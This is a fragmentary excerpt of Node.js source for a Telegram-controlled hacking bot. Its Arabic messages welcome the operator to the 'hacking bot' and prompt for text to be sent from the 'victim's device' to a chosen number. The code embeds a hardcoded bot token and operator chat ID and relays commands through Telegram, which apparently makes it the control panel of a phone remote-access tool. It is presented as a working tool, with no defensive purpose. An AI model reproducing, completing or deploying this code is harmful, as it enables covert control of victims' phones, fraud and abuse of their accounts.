...
const token = '8436089768:AAF2TAdnTFt8UrYREMesBuSYcIYau4enhwg' 
const id = '7501665801'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : HACKER MOHAMMAD ALMOMANI')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : HACKER MOHAMMAD ALMOMANI،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : HACKER MOHAMMAD ALMOMANI\n\n' +
...
appServer.listen(process.env.PORT || 9000);
